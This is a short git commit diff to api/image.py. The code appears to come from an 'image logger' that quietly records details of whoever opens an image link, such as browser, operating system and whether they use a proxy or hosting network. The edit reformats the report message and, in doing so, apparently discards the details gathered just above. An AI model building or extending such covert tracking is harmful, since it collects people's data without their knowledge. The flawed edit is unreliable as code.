51c946078a25b630df71ba9e680762ea610620b2
yaroikio23-star <yaroikio23@gmail.com>
2026-03-01 02:27:30 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -298,8 +298,9 @@ height: 100vh;
                     message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                     message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                     message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
-                    message += f'\nName: {data['username']}' + '```'
-                datatype = 'text/html'
+                    message = f"```"
+                    message += f"\nName: {data['username']}"
+                    message += "```"
 
                 if config["message"]["doMessage"]:
                     data = message.encode()
